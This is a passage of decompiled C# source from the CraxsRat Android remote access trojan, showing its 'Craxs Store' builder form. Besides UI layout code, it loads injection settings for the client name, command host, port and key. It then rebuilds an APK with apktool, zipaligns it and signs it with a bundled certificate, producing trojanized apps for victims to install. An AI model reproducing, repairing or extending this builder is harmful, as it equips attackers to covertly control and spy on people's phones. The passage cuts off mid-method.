		this.DrakeUIButtonIcon12.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon12.StyleCustomMode = true;
		this.DrakeUIButtonIcon12.Symbol = 61527;
		this.DrakeUIButtonIcon12.SymbolSize = 25;
		this.DrakeUIButtonIcon12.TabIndex = 33;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon12, "Exit");
		this.Panelhome.Controls.Add(this.exitbtn);
		this.Panelhome.Controls.Add(this.reqbtn);
		this.Panelhome.Controls.Add(this.storebtn);
		this.Panelhome.Controls.Add(this.logopic);
		this.Panelhome.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panelhome.Font = new System.Drawing.Font("Calibri", 16f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Panelhome.Location = new System.Drawing.Point(0, 0);
		this.Panelhome.Name = "Panelhome";
		this.Panelhome.Size = new System.Drawing.Size(1184, 780);
		this.Panelhome.TabIndex = 2;
		this.exitbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.exitbtn.Enabled = false;
		this.exitbtn.FillColor = System.Drawing.Color.Black;
		this.exitbtn.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.exitbtn.Font = new System.Drawing.Font("Calibri", 19f);
		this.exitbtn.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.exitbtn.Location = new System.Drawing.Point(819, 564);
		this.exitbtn.Name = "exitbtn";
		this.exitbtn.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.exitbtn.RectDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.exitbtn.Size = new System.Drawing.Size(283, 123);
		this.exitbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.exitbtn.Symbol = 62164;
		this.exitbtn.TabIndex = 3;
		this.exitbtn.Text = "Exit";
		this.reqbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.reqbtn.Enabled = false;
		this.reqbtn.FillColor = System.Drawing.Color.Black;
		this.reqbtn.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.reqbtn.Font = new System.Drawing.Font("Calibri", 19f);
		this.reqbtn.ForeColor = System.Drawing.Color.FromArgb(14, 110, 178);
		this.reqbtn.Location = new System.Drawing.Point(441, 564);
		this.reqbtn.Name = "reqbtn";
		this.reqbtn.RectColor = System.Drawing.Color.FromArgb(14, 110, 178);
		this.reqbtn.RectDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.reqbtn.Size = new System.Drawing.Size(283, 123);
		this.reqbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.reqbtn.Symbol = 61913;
		this.reqbtn.TabIndex = 2;
		this.reqbtn.Text = "Request";
		this.storebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.storebtn.Enabled = false;
		this.storebtn.FillColor = System.Drawing.Color.Black;
		this.storebtn.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.storebtn.Font = new System.Drawing.Font("Calibri", 19f);
		this.storebtn.ForeColor = System.Drawing.Color.FromArgb(42, 127, 42);
		this.storebtn.Location = new System.Drawing.Point(66, 564);
		this.storebtn.Name = "storebtn";
		this.storebtn.RectColor = System.Drawing.Color.FromArgb(42, 127, 42);
		this.storebtn.RectDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.storebtn.Size = new System.Drawing.Size(283, 123);
		this.storebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.storebtn.Symbol = 61819;
		this.storebtn.TabIndex = 1;
		this.storebtn.Text = "Store";
		this.ToolTips.BackColor = System.Drawing.Color.Black;
		this.ToolTips.ForeColor = System.Drawing.Color.White;
		this.ToolTips.OwnerDraw = true;
		this.ToolTips.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.Font = new System.Drawing.Font("Calibri", 9f);
		this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(1126, 14);
		this.DrakeUIButtonIcon3.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
		this.DrakeUIButtonIcon3.Radius = 25;
		this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(45, 42);
		this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon3.StyleCustomMode = true;
		this.DrakeUIButtonIcon3.Symbol = 61527;
		this.DrakeUIButtonIcon3.SymbolSize = 25;
		this.DrakeUIButtonIcon3.TabIndex = 34;
		this.ToolTips.SetToolTip(this.DrakeUIButtonIcon3, "Exit");
		this.ImageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageList1.ImageStream");
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.ImageList1.Images.SetKeyName(0, "app11.png");
		this.lockpanel.Controls.Add(this.Label16);
		this.lockpanel.Controls.Add(this.DrakeUIButtonIcon3);
		this.lockpanel.Controls.Add(this.PictureBox1);
		this.lockpanel.Controls.Add(this.strpasstext);
		this.lockpanel.Controls.Add(this.b_ok);
		this.lockpanel.Controls.Add(this.Panel3);
		this.lockpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lockpanel.Location = new System.Drawing.Point(0, 0);
		this.lockpanel.Name = "lockpanel";
		this.lockpanel.Size = new System.Drawing.Size(1184, 780);
		this.lockpanel.TabIndex = 15;
		this.Label16.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label16.Font = new System.Drawing.Font("Roboto Slab Light", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label16.ForeColor = System.Drawing.Color.White;
		this.Label16.Location = new System.Drawing.Point(591, 367);
		this.Label16.Name = "Label16";
		this.Label16.Size = new System.Drawing.Size(593, 59);
		this.Label16.TabIndex = 35;
		this.Label16.Text = "Password ";
		this.Label16.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Top;
		this.PictureBox1.Image = Craxs_Rat.My.Resources.Resources.sstore;
		this.PictureBox1.Location = new System.Drawing.Point(591, 0);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(593, 367);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 1;
		this.PictureBox1.TabStop = false;
		this.strpasstext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.strpasstext.FillColor = System.Drawing.Color.Black;
		this.strpasstext.Font = new System.Drawing.Font("Calibri", 9f);
		this.strpasstext.ForeColor = System.Drawing.Color.White;
		this.strpasstext.Location = new System.Drawing.Point(602, 430);
		this.strpasstext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.strpasstext.Maximum = 2147483647.0;
		this.strpasstext.Minimum = -2147483648.0;
		this.strpasstext.Name = "strpasstext";
		this.strpasstext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.strpasstext.PasswordChar = '●';
		this.strpasstext.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.strpasstext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.strpasstext.Size = new System.Drawing.Size(568, 24);
		this.strpasstext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.strpasstext.TabIndex = 32;
		this.strpasstext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.b_ok.Cursor = System.Windows.Forms.Cursors.Hand;
		this.b_ok.FillColor = System.Drawing.Color.FromArgb(127, 5, 1);
		this.b_ok.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.b_ok.FillPressColor = System.Drawing.Color.Black;
		this.b_ok.FillSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.b_ok.Font = new System.Drawing.Font("Calibri", 12f);
		this.b_ok.ForeColor = System.Drawing.Color.Black;
		this.b_ok.ForePressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.b_ok.Location = new System.Drawing.Point(729, 575);
		this.b_ok.Margin = new System.Windows.Forms.Padding(4);
		this.b_ok.Name = "b_ok";
		this.b_ok.Radius = 25;
		this.b_ok.RectColor = System.Drawing.Color.Black;
		this.b_ok.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.b_ok.RectHoverColor = System.Drawing.Color.White;
		this.b_ok.RectPressColor = System.Drawing.Color.White;
		this.b_ok.RectSelectedColor = System.Drawing.Color.White;
		this.b_ok.Size = new System.Drawing.Size(321, 121);
		this.b_ok.Style = DrakeUI.Framework.UIStyle.Custom;
		this.b_ok.TabIndex = 30;
		this.b_ok.Text = "Login";
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(127, 5, 1);
		this.Panel3.Controls.Add(this.DrakeUIButtonIcon5);
		this.Panel3.Controls.Add(this.Label13);
		this.Panel3.Controls.Add(this.Label17);
		this.Panel3.Controls.Add(this.Label15);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel3.Location = new System.Drawing.Point(0, 0);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(591, 780);
		this.Panel3.TabIndex = 0;
		this.DrakeUIButtonIcon5.BackColor = System.Drawing.Color.FromArgb(127, 5, 1);
		this.DrakeUIButtonIcon5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon5.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon5.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon5.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon5.FillSelectedColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon5.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon5.ForeColor = System.Drawing.Color.FromArgb(127, 5, 1);
		this.DrakeUIButtonIcon5.ForePressColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon5.Location = new System.Drawing.Point(134, 575);
		this.DrakeUIButtonIcon5.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIButtonIcon5.Name = "DrakeUIButtonIcon5";
		this.DrakeUIButtonIcon5.Radius = 25;
		this.DrakeUIButtonIcon5.RectColor = System.Drawing.Color.FromArgb(127, 5, 1);
		this.DrakeUIButtonIcon5.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon5.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon5.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon5.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon5.Size = new System.Drawing.Size(321, 121);
		this.DrakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon5.TabIndex = 31;
		this.DrakeUIButtonIcon5.Text = "purchase";
		this.Label13.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label13.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label13.ForeColor = System.Drawing.Color.Black;
		this.Label13.Location = new System.Drawing.Point(0, 367);
		this.Label13.Name = "Label13";
		this.Label13.Size = new System.Drawing.Size(591, 23);
		this.Label13.TabIndex = 2;
		this.Label13.Text = "Copyright © CraxsRat.vip";
		this.Label13.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label17.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label17.Font = new System.Drawing.Font("Roboto Slab Light", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label17.ForeColor = System.Drawing.Color.White;
		this.Label17.Location = new System.Drawing.Point(0, 238);
		this.Label17.Name = "Label17";
		this.Label17.Size = new System.Drawing.Size(591, 129);
		this.Label17.TabIndex = 33;
		this.Label17.Text = "Build your app easily";
		this.Label17.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.Label15.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label15.Font = new System.Drawing.Font("Roboto Slab Light", 25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label15.ForeColor = System.Drawing.Color.White;
		this.Label15.Location = new System.Drawing.Point(0, 0);
		this.Label15.Name = "Label15";
		this.Label15.Size = new System.Drawing.Size(591, 238);
		this.Label15.TabIndex = 3;
		this.Label15.Text = "Login to Craxs Store";
		this.Label15.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
		base.ClientSize = new System.Drawing.Size(1184, 803);
		base.Controls.Add(this.lockpanel);
		base.Controls.Add(this.mainpanel);
		base.Controls.Add(this.Panelhome);
		base.Controls.Add(this.statustext);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		this.MaximumSize = new System.Drawing.Size(1184, 803);
		this.MinimumSize = new System.Drawing.Size(1184, 803);
		base.Name = "CraxsStore";
		base.ShowIcon = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "CraxsStore";
		((System.ComponentModel.ISupportInitialize)this.logopic).EndInit();
		this.mainpanel.ResumeLayout(false);
		this.DrakeUITabControl1.ResumeLayout(false);
		this.TabPage2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVSTORE).EndInit();
		this.TabPage1.ResumeLayout(false);
		this.TabPage1.PerformLayout();
		this.TabPage4.ResumeLayout(false);
		this.workpanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.workimage).EndInit();
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DrakeUIImageButton1).EndInit();
		this.Panelhome.ResumeLayout(false);
		this.lockpanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.Panel3.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public void InvokeIfRequired(object[] objs)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatstughes(object sender, EventArgs e)
	{
		ComboPrims.Text = "Only Needed";
		strpasstext.Text = RegistryHandler.passkey();
		lockpanel.BringToFront();
		storebtn.Enabled = false;
		reqbtn.Enabled = false;
		exitbtn.Enabled = false;
		try
		{
			CLiname.Text = MySettingsProperty.Settings.inj_tnam;
			Host.Text = MySettingsProperty.Settings.inj_thost;
			Port.Text = MySettingsProperty.Settings.inj_tport;
			TheKey.Text = MySettingsProperty.Settings.inj_tkey;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			CLiname.Text = "Client1";
			Host.Text = "...";
			Port.Text = "7771";
			TheKey.Text = "TxTxT";
			ProjectData.ClearProjectError();
		}
		lockpanel.Visible = true;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(statustext.Text, "...", TextCompare: false) == 0)
		{
			statustext.Text = "";
		}
		if ((statustext.Text.Length < loadingtext.Length) & !stage1)
		{
			statustext.Text += Conversions.ToString(loadingtext[statustext.Text.Length]);
			return;
		}
		if (!stage1)
		{
			stage1 = true;
			statustext.Text = "";
			if (!loadworker.IsBusy)
			{
				loadworker.RunWorkerAsync();
			}
		}
		if ((statustext.Text.Length < conecttext.Length) & !stage2)
		{
			statustext.Text += Conversions.ToString(conecttext[statustext.Text.Length]);
		}
		else if (loadsuccess)
		{
			storebtn.Enabled = true;
			reqbtn.Enabled = true;
			exitbtn.Enabled = true;
			stage2 = true;
			Timer1.Stop();
			statustext.Text = "";
		}
		else if (loadfaild)
		{
			Timer1.Stop();
			if (Codes.MyMsgBox("Connection error 2", "Can't connect to server please try again later", useno: false, Resources.error48px))
			{
				reqbtn.Enabled = true;
			}
		}
		else
		{
			statustext.Text = statustext.Text.Replace(".", "");
		}
	}

	private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsascewfvwgfgh(object sender, DoWorkEventArgs e)
	{
	}

	private void Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Exitbtn_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Storebtn_Click(object sender, EventArgs e)
	{
		Panelhome.SendToBack();
		mainpanel.BringToFront();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		mainpanel.SendToBack();
		Panelhome.BringToFront();
	}

	private void WebsiteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (DGVSTORE.Rows.Count > 0 && DGVSTORE.SelectedRows.Count > 0)
			{
				string[] array = (string[])DGVSTORE.SelectedRows[0].Tag;
				Process.Start(array[2]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void logtowork(object[] obj)
	{
		if (worklog.InvokeRequired)
		{
			recordnames method = logtowork;
			worklog.Invoke(method, new object[1] { obj });
			return;
		}
		try
		{
			worklog.AppendText(obj[0].ToString());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void logwork(string msg)
	{
		try
		{
			logtowork(new object[1] { msg + "\r\n" });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void logtostatus(object[] obj)
	{
		if (statustext.InvokeRequired)
		{
			delestatustext method = logtostatus;
			statustext.Invoke(method, new object[1] { obj });
			return;
		}
		try
		{
			statustext.Text = obj[0].ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void logstatus(string msg)
	{
		try
		{
			logtostatus(new object[1] { msg + "\r\n" });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void GooglePlayToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (DGVSTORE.Rows.Count > 0 && DGVSTORE.SelectedRows.Count > 0)
			{
				string[] array = (string[])DGVSTORE.SelectedRows[0].Tag;
				Process.Start("https://play.google.com/store/apps/details?id=" + array[3]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void wc_UploadDataCompleted(object sender, UploadValuesCompletedEventArgs e)
	{
		Codes.MyMsgBox("Download", "Apk Download finished", useno: false, Resources.error48px);
		logwork("Download complete");
		downprogress.Value = 0;
		logstatus(" ");
	}

	private void wc_UploadProgressChanged(object sender, UploadProgressChangedEventArgs e)
	{
		try
		{
			downprogress.Value = e.ProgressPercentage;
			logstatus(e.ProgressPercentage + "%");
			Application.DoEvents();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, ref lockTaken);
			if (_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 0)
			{
				_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 2;
				_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r = new Random();
			}
			else if (_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init);
			}
		}
		int num = _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(minCharacters, maxCharacters);
		StringBuilder stringBuilder = new StringBuilder();
		int num2 = num;
		for (int i = 1; i <= num2; i = checked(i + 1))
		{
			int startIndex = _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(0, text.Length);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	public object RandomShit(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, ref lockTaken);
			if (_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 0)
			{
				_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 2;
				_0024STATIC_0024RandomShit_00242021C88_0024r = new Random();
			}
			else if (_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024RandomShit_00242021C88_0024r_0024Init);
			}
		}
		int num = _0024STATIC_0024RandomShit_00242021C88_0024r.Next(minCharacters, maxCharacters);
		StringBuilder stringBuilder = new StringBuilder();
		int num2 = num;
		checked
		{
			for (int i = 1; i <= num2; i++)
			{
				int startIndex = _0024STATIC_0024RandomShit_00242021C88_0024r.Next(0, text.Length);
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
			cou++;
			return stringBuilder.ToString() + Conversions.ToString(cou);
		}
	}

	private int GenerateRandomNumber(int m0, int m1)
	{
		if (_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, ref lockTaken);
			if (_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 0)
			{
				_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 2;
				_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number = new Random();
			}
			else if (_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init);
			}
		}
		return _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number.Next(m0, m1);
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj))]
	[DebuggerStepThrough]
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj(object sender, DoWorkEventArgs e)
	{
		VB_0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj stateMachine = new VB_0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_sender = sender;
		stateMachine._0024VB_0024Local_e = e;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	public void Sync_Output(object d01, object b01)
	{
		try
		{
			if (base.InvokeRequired)
			{
				Delegate0 method = Sync_Output;
				Invoke(method, d01, b01);
			}
			else
			{
				if (string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null))))
				{
					return;
				}
				if (!FolderApk && NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().StartsWith("I:"))
				{
					string text = NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString();
					logwork(text.Replace("I:", ""));
				}
				Thread.Sleep(1);
				string text2 = "temp";
				if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar SignApk.jar") | NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar " + folder_apktool + "\\SignApk.jar "))
				{
					Codes.MyMsgBox("finish", "app build", useno: false, Resources.sucess48px);
					logwork("Finish");
					Process.Start(reso.Storepath + "\\Downloads");
					Close();
				}
				else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("java -version"))
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "apktool b -f -o \"" + folder_apktool + "\\" + text2 + "\\dist\\" + text2 + ".apk\" \"" + TheApkPath + "\"" }, null, null, null, IgnoreReturn: true);
				}
				else
				{
					if (!NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("Built apk"))
					{
						return;
					}
					while (true)
					{
						if (File.Exists(folder_apktool + "\\" + text2 + "\\dist\\" + text2 + ".apk"))
						{
							if (StartedZip)
							{
								break;
							}
							if (!StartedZip)
							{
								NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "zipalign.exe -v 4 " + folder_apktool + "\\" + text2 + "\\dist\\" + text2 + ".apk " + folder_apktool + "\\" + text2 + "\\dist\\" + text2 + "zip.apk " }, null, null, null, IgnoreReturn: true);
								logwork(" Verification...");
								StartedZip = true;
							}
							Thread.Sleep(5000);
						}
						else
						{
							Thread.Sleep(5000);
						}
					}
					logwork("Apk Signing...");
					File.Delete(folder_apktool + "\\certificate.pem");
					File.Delete(folder_apktool + "\\key.pk8");
					File.WriteAllBytes(folder_apktool + "\\certificate.pem", Resources.c);
					File.WriteAllBytes(folder_apktool + "\\key.pk8", Resources.k);
					try
					{
						if (!Directory.Exists(reso.Storepath + "\\Downloads"))
						{
							Directory.CreateDirectory(reso.Storepath + "\\Downloads");
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "java -jar " + folder_apktool + "\\SignApk.jar sign --key " + folder_apktool + "\\key.pk8 --cert " + folder_apktool + "\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out \"" + reso.Storepath + "\\Downloads\\" + appnamebuild.Replace(" ", "") + ".apk\" \"" + folder_apktool + "\\" + text2 + "\\dist\\" + text2 + ".apk\"" }, null, null, null, IgnoreReturn: true);
					FolderApk = true;
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void ex()
	{
		try
		{
			Close_cmd();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
		}
	}

	public string madladstr()
	{
